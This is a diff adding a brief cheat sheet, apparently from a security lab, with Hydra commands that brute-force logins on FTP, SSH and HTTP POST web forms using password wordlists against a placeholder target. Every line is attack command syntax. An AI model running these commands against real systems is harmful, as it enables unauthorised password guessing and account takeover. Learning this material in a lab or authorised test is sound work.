@@ -1,0 +1,14 @@
+
+FTP
+hydra -l user -P passlist.txt ftp://MACHINE_IP
+
+SSH (+ most other services)
+hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
+
+
+POST WEB FORM
+sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
+
+hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
+
+hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s <port> -V
